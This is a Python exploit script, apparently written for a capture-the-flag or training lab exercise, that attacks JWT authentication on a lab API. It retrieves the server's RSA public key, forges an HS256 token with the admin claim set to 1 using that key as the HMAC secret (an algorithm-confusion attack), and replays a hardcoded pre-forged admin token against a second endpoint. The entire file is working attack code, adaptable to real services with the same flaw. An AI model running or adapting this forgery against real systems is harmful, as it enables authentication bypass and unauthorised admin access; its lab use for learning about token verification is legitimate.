import requests
import json
import hmac
import hashlib
import base64

# --- Configuration (Adjusted for Example 6) ---
# NOTE: The IP for Example 6 is not provided. The script will prompt the user.
TARGET_IP = "10.64.168.127"
AUTH_URL = f"http://{TARGET_IP}/api/v1.0/example5"
FLAG_URL_E5 = f"http://{TARGET_IP}/api/v1.0/example5?username=admin"
FLAG_URL_E6 = f"http://{TARGET_IP}/api/v1.0/example6?username=admin" # Assumed endpoint for Example 6
USERNAME = "user"
PASSWORD = "password5"
# ---------------------

def base64url_encode(data):
    """Encodes bytes to Base64URL string (removes padding, replaces chars)"""
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode('utf-8')

def sign_token(header_b64, payload_b64, secret_key):
    """
    Manually calculates the HS256 signature using the public key as the secret.
    This bypasses pyjwt's key validation check.
    """
    # Data to sign is the encoded header and payload joined by a dot
    data_to_sign = f"{header_b64}.{payload_b64}".encode('utf-8')
    
    # Calculate HMAC-SHA256 signature
    signature_bytes = hmac.new(
        secret_key.encode('utf-8'),
        data_to_sign,
        hashlib.sha256
    ).digest()
    
    # Base64URL encode the signature
    return base64url_encode(signature_bytes)

def forge_jwt_token(public_key):
    """
    Forges the JWT by changing the algorithm to HS256 and admin to 1,
    then signing it with the public key as the secret. (For Example 5)
    """
    print("[*] Forging Malicious Token...")

    # 1. Malicious Header (RS256 -> HS256)
    # Decoded: {"typ":"JWT","alg":"HS256"}
    header_b64 = base64url_encode(json.dumps({"typ":"JWT","alg":"HS256"}).encode('utf-8'))
    
    # 2. Malicious Payload (admin: 0 -> 1)
    payload = {
        'username': USERNAME,
        'admin': 1
    }
    payload_b64 = base64url_encode(json.dumps(payload).encode('utf-8'))
    
    # 3. Sign the token using the full public key as the HS256 secret
    signature_b64 = sign_token(header_b64, payload_b64, public_key)
    
    # Final JWT structure: Header.Payload.Signature
    forged_token = f"{header_b64}.{payload_b64}.{signature_b64}"
    
    print(f"[+] Forged JWT: {forged_token}")
    return forged_token

def exploit_example5():
    # Step 1: Authenticate to retrieve public key and original token
    print(f"[*] Exploit 5: Starting JWT Algorithm Confusion Attack.")
    print(f"[*] Sending initial authentication request to {AUTH_URL}")
    auth_data = json.dumps({"username": USERNAME, "password": PASSWORD})
    
    try:
        response = requests.post(
            AUTH_URL,
            data=auth_data,
            headers={'Content-Type': 'application/json'}
        )
        response.raise_for_status() # Raise exception for bad status codes
    except requests.exceptions.RequestException as e:
        print(f"[-] HTTP Request Failed: {e}")
        return

    try:
        data = response.json()
        if 'public_key' not in data:
            print("[-] Error: 'public_key' not found in response.")
            print(f"Response: {data}")
            return

        public_key = data['public_key']
        print(f"[+] Public Key Retrieved: {public_key[:60]}...")
    except json.JSONDecodeError:
        print(f"[-] Error: Failed to decode JSON response. Received: {response.text}")
        return

    # Step 2: Forge the malicious JWT
    forged_token = forge_jwt_token(public_key)

    # Step 3: Use the forged token to get the flag
    print(f"\n[*] Sending final request with forged token to {FLAG_URL_E5}")
    flag_response = requests.get(
        FLAG_URL_E5,
        headers={'Authorization': f'Bearer {forged_token}'}
    )

    print("-" * 50)
    print(f"Example 5 Result (Algorithm Confusion):")
    print(f"Request URL: {FLAG_URL_E5}")
    print(f"Response Status: {flag_response.status_code}")
    print("Response Body:")
    print(flag_response.text.strip())
    print("-" * 50)

def exploit_example6(ip_address):
    """
    Exploits Example 6 (Permanent Token) by using the given pre-forged token.
    """
    global TARGET_IP, FLAG_URL_E6
    TARGET_IP = ip_address
    FLAG_URL_E6 = f"http://{TARGET_IP}/api/v1.0/example6?username=admin"

    print(f"[*] Exploit 6: Starting Permanent Token Exploit.")
    
    # The token provided in the challenge description
    FORGED_TOKEN_E6 = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJhZG1pbiI6MX0.ko7EQiATQQzrQPwRO8ZTY37pQWGLPZWEvdWH0tVDNPU"
    
    print(f"[*] Using pre-forged token (admin: 1): {FORGED_TOKEN_E6[:60]}...")
    
    # Step 1: Use the permanent token to get the flag
    print(f"\n[*] Sending request with permanent token to {FLAG_URL_E6}")
    
    try:
        flag_response = requests.get(
            FLAG_URL_E6,
            headers={'Authorization': f'Bearer {FORGED_TOKEN_E6}'}
        )
        flag_response.raise_for_status()
    except requests.exceptions.RequestException as e:
        print(f"[-] HTTP Request Failed: {e}")
        return

    print("-" * 50)
    print(f"Example 6 Result (Permanent Token):")
    print(f"Request URL: {FLAG_URL_E6}")
    print(f"Response Status: {flag_response.status_code}")
    print("Response Body (Flag likely here):")
    print(flag_response.text.strip())
    print("-" * 50)


if __name__ == "__main__":
    
    # Prompt the user for the IP address for Example 6
    print("--- JWT Exploiter Script ---")
    print(f"Current target IP set to: {TARGET_IP} (from Example 5 config)")
    e6_ip = input("Please enter the IP address for Practical Example 6: ")

    if e6_ip:
        # Run Example 6 exploit with the new IP
        exploit_example6(e6_ip)
    else:
        print("Using default IP for Example 5.")
        exploit_example5()